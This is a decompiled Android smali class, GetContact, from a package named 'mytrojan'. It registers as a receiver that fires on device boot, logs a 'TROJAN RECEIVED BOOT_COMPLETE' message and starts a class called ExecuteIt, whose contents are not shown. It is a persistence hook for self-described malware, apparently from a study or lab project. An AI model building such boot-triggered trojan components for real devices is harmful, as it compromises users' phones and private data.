.class public Lcom/example/mytrojan/GetContact;
.super Landroid/content/BroadcastReceiver;
.source "GetContact.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 10
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 5
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 14
    const-string v0, "GET_CONTACT"

    const-string v1, "TROJAN RECEIVED BOOT_COMPLETE"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 15
    new-instance v0, Lcom/example/mytrojan/ExecuteIt;

    invoke-direct {v0}, Lcom/example/mytrojan/ExecuteIt;-><init>()V

    .line 16
    return-void
.end method
